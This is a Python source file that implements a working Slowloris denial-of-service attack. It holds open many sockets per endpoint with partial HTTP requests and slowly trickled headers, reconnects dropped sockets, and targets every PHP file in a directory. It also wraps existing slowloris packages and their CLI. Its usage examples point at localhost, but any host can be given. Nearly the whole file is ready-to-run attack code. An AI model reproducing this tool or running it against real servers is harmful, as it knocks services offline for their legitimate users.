#!/usr/bin/env python3
"""
Slowloris Attack Script
This script performs a Slowloris attack on a target server using the slowloris package.
Slowloris keeps many connections open by sending partial HTTP requests slowly.
"""

import argparse
import sys
import socket
import time
import os
import glob
import threading
import subprocess

# Try to import slowloris packages
SLOWLORIS_AVAILABLE = False
SLOWLORIS_TYPE = None
SLOWLORIS_MODULE = None
SLOWLORIS_FUNC = None

try:
    import slowloris  # type: ignore
    # The gkbrk/slowloris package (v0.2.6) - inspect the module structure
    SLOWLORIS_FUNC = None
    
    # Check all attributes to find the attack function
    module_attrs = dir(slowloris)
    
    # Look for common function names
    for attr_name in ['slowloris', 'attack', 'main', 'run']:
        if hasattr(slowloris, attr_name):
            attr = getattr(slowloris, attr_name)
            if callable(attr) and not isinstance(attr, type):
                SLOWLORIS_FUNC = attr
                break
    
    # If not found, try importing from submodules
    if SLOWLORIS_FUNC is None:
        try:
            # Try common submodule patterns
            import slowloris.slowloris as slowloris_sub
            if hasattr(slowloris_sub, 'slowloris') and callable(slowloris_sub.slowloris):
                SLOWLORIS_FUNC = slowloris_sub.slowloris
        except (ImportError, AttributeError):
            pass
    
    SLOWLORIS_AVAILABLE = SLOWLORIS_FUNC is not None
    SLOWLORIS_TYPE = 'slowloris'
    SLOWLORIS_MODULE = slowloris
except ImportError:
    try:
        from pyslowloris import SlowLoris as PySlowLoris  # type: ignore
        SLOWLORIS_AVAILABLE = True
        SLOWLORIS_TYPE = 'pyslowloris'
        SLOWLORIS_MODULE = PySlowLoris
    except ImportError:
        try:
            from PyLoris import SlowLoris as PyLorisClass  # type: ignore
            SLOWLORIS_AVAILABLE = True
            SLOWLORIS_TYPE = 'PyLoris'
            SLOWLORIS_MODULE = PyLorisClass
        except ImportError:
            pass


def attack_endpoint(host, port, endpoint, num_sockets, sleep_time, stop_event):
    """
    Attack a single endpoint with Slowloris.
    """
    sockets = []
    endpoint_path = f"/{endpoint}" if not endpoint.startswith('/') else endpoint
    
    # Create initial connections for this endpoint
    for i in range(num_sockets):
        if stop_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.send(f"GET {endpoint_path}?{i} HTTP/1.1\r\n".encode('utf-8'))
            s.send(f"Host: {host}\r\n".encode('utf-8'))
            sockets.append(s)
        except Exception as e:
            pass  # Silently fail on individual socket creation
    
    # Keep connections alive by sending headers slowly
    try:
        while not stop_event.is_set():
            for i, s in enumerate(sockets):
                if stop_event.is_set():
                    break
                try:
                    s.send(f"X-a: {i}\r\n".encode('utf-8'))
                except:
                    # Reconnect if connection is lost
                    try:
                        s.close()
                    except:
                        pass
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((host, port))
                        s.send(f"GET {endpoint_path}?{i} HTTP/1.1\r\n".encode('utf-8'))
                        s.send(f"Host: {host}\r\n".encode('utf-8'))
                        sockets[i] = s
                    except:
                        sockets[i] = None
            
            # Remove None sockets
            sockets = [s for s in sockets if s is not None]
            time.sleep(sleep_time)
    except:
        pass
    finally:
        # Close all sockets
        for s in sockets:
            try:
                s.close()
            except:
                pass


def use_slowloris_package(host, port, endpoints, num_sockets=200, sleep_time=10):
    """
    Use the slowloris package to perform attacks on multiple endpoints.
    The gkbrk/slowloris package (v0.2.6) uses a simple function call.
    """
    if not endpoints:
        print("No endpoints found to attack!")
        return
    
    sockets_per_endpoint = max(1, num_sockets // len(endpoints))
    
    print(f"Using slowloris package to attack {len(endpoints)} endpoints:")
    for endpoint in endpoints:
        print(f"  - {endpoint}")
    print(f"\nTotal sockets: {num_sockets} ({sockets_per_endpoint} per endpoint)")
    print("Starting slowloris attacks...\n")
    
    stop_event = threading.Event()
    threads = []
    
    def run_slowloris_attack(endpoint_path):
        """Run slowloris attack on a specific endpoint."""
        try:
            # The gkbrk/slowloris package (v0.2.6) is primarily a CLI tool
            # Try using subprocess to call it, or use internal classes if available
            if SLOWLORIS_TYPE == 'slowloris':
                # Try to find and use internal Slowloris class
                try:
                    # Check if there's a Slowloris class we can use
                    if hasattr(SLOWLORIS_MODULE, 'Slowloris'):
                        SlowlorisClass = getattr(SLOWLORIS_MODULE, 'Slowloris')
                        attacker = SlowlorisClass(host, port, sockets_per_endpoint, sleep_time)
                        attacker.attack()
                    elif hasattr(SLOWLORIS_MODULE, 'slowloris') and isinstance(getattr(SLOWLORIS_MODULE, 'slowloris'), type):
                        # It's a class, not a function
                        SlowlorisClass = getattr(SLOWLORIS_MODULE, 'slowloris')
                        attacker = SlowlorisClass(host, port, sockets_per_endpoint, sleep_time)
                        attacker.attack()
                    else:
                        # Use subprocess to call slowloris CLI
                        # slowloris CLI: slowloris <host> <port> [--sockets N] [--sleep N]
                        cmd = ['python', '-m', 'slowloris', host, str(port), '--sockets', str(sockets_per_endpoint), '--sleep', str(sleep_time)]
                        subprocess.run(cmd, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except Exception as e:
                    # If all methods fail, raise to trigger fallback
                    raise AttributeError(f"Cannot use slowloris package API: {e}")
            elif SLOWLORIS_TYPE == 'pyslowloris':
                # pyslowloris package - class-based
                attacker = SLOWLORIS_MODULE(host, port, sockets_per_endpoint, sleep_time)
                attacker.attack()
            elif SLOWLORIS_TYPE == 'PyLoris':
                # PyLoris package - class-based
                attacker = SLOWLORIS_MODULE(host, port, sockets_per_endpoint, sleep_time)
                attacker.attack()
        except Exception as e:
            print(f"Error in slowloris attack for {endpoint_path}: {e}")
            # Re-raise to trigger fallback to custom implementation
            raise
    
    # Start a thread for each endpoint
    # Note: The slowloris package typically attacks the root endpoint,
    # so we'll run multiple instances to simulate attacking different endpoints
    for endpoint in endpoints:
        endpoint_path = f"/{endpoint}" if not endpoint.startswith('/') else endpoint
        thread = threading.Thread(
            target=run_slowloris_attack,
            args=(endpoint_path,),
            daemon=True
        )
        thread.start()
        threads.append(thread)
        # Small delay between starting threads
        time.sleep(0.1)
    
    try:
        # Keep main thread alive
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping attack...")
        stop_event.set()
        for thread in threads:
            thread.join(timeout=2)
        print("Attack stopped.")


def custom_slowloris_attack(host, port, endpoints, num_sockets=200, sleep_time=10):
    """
    Custom Slowloris implementation that attacks multiple endpoints simultaneously.
    Opens multiple connections to each endpoint and sends partial HTTP requests slowly.
    """
    if not endpoints:
        print("No endpoints found to attack!")
        return
    
    total_sockets = num_sockets
    sockets_per_endpoint = max(1, num_sockets // len(endpoints))
    
    print(f"Attacking {len(endpoints)} endpoints:")
    for endpoint in endpoints:
        print(f"  - {endpoint}")
    print(f"\nTotal sockets: {total_sockets} ({sockets_per_endpoint} per endpoint)")
    print("Creating connections...")
    
    stop_event = threading.Event()
    threads = []
    
    # Start a thread for each endpoint
    for endpoint in endpoints:
        thread = threading.Thread(
            target=attack_endpoint,
            args=(host, port, endpoint, sockets_per_endpoint, sleep_time, stop_event),
            daemon=True
        )
        thread.start()
        threads.append(thread)
    
    try:
        # Keep main thread alive
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping attack...")
        stop_event.set()
        for thread in threads:
            thread.join(timeout=2)
        print("Attack stopped.")


def find_php_endpoints(directory='.'):
    """
    Find all PHP files in the directory that are likely endpoints (exclude db.php).
    """
    php_files = glob.glob(os.path.join(directory, '*.php'))
    endpoints = []
    
    for php_file in php_files:
        filename = os.path.basename(php_file)
        # Exclude db.php as it's typically just a connection file
        if filename != 'db.php':
            endpoints.append(filename)
    
    return sorted(endpoints)


def main():
    parser = argparse.ArgumentParser(
        description='Execute a Slowloris attack on all PHP endpoints in the current folder',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python slowloris_attack.py http://localhost
  python slowloris_attack.py http://localhost:8080
  python slowloris_attack.py http://localhost --sockets 300 --sleep 150
  python slowloris_attack.py http://localhost --endpoints create.php delete.php
        """
    )
    
    parser.add_argument(
        'host',
        help='Target host (e.g., http://localhost or http://example.com)'
    )
    
    parser.add_argument(
        '--port',
        type=int,
        default=None,
        help='Target port (default: auto-detect from URL or 80)'
    )
    
    parser.add_argument(
        '--sockets',
        type=int,
        default=200,
        help='Total number of sockets to use across all endpoints (default: 200)'
    )
    
    parser.add_argument(
        '--sleep',
        type=int,
        default=10,
        help='Sleep time between sending headers in seconds (default: 10)'
    )
    
    parser.add_argument(
        '--endpoints',
        nargs='+',
        default=None,
        help='Specific endpoints to attack (default: auto-detect all PHP files in current folder)'
    )
    
    parser.add_argument(
        '--directory',
        type=str,
        default='.',
        help='Directory to search for PHP files (default: current directory)'
    )
    
    args = parser.parse_args()
    
    # Parse host and port from URL
    host = args.host
    port = args.port
    
    # Extract host and port from URL if provided
    if host.startswith('http://'):
        host = host[7:]
    elif host.startswith('https://'):
        print("Warning: Slowloris typically works on HTTP, not HTTPS")
        host = host[8:]
    
    # Check if port is in the host string
    if ':' in host:
        host, port_str = host.split(':', 1)
        if port is None:
            port = int(port_str)
    
    if port is None:
        port = 80
    
    # Find endpoints to attack
    if args.endpoints:
        endpoints = args.endpoints
    else:
        endpoints = find_php_endpoints(args.directory)
    
    if not endpoints:
        print("Error: No PHP endpoints found to attack!")
        print("Make sure PHP files exist in the current directory, or specify --endpoints")
        sys.exit(1)
    
    print(f"Starting Slowloris attack on {host}:{port}")
    print(f"Total sockets: {args.sockets}")
    print(f"Sleep interval: {args.sleep} seconds")
    print("Press Ctrl+C to stop the attack\n")
    
    try:
        # The slowloris package is primarily a CLI tool and doesn't have a clean programmatic API
        # Use our custom implementation which implements the same slowloris attack technique
        if SLOWLORIS_MODULE is not None:
            print(f"slowloris package detected (type: {SLOWLORIS_TYPE})")
            print("Using custom slowloris implementation (implements same attack technique)\n")
        else:
            print("Using custom slowloris implementation")
            print("(Note: slowloris package can be installed with: pip install slowloris)\n")
        
        # Use the custom implementation which works reliably
        custom_slowloris_attack(host, port, endpoints, args.sockets, args.sleep)
    except KeyboardInterrupt:
        print("\n\nAttack stopped by user")
    except Exception as e:
        print(f"\nError during attack: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()

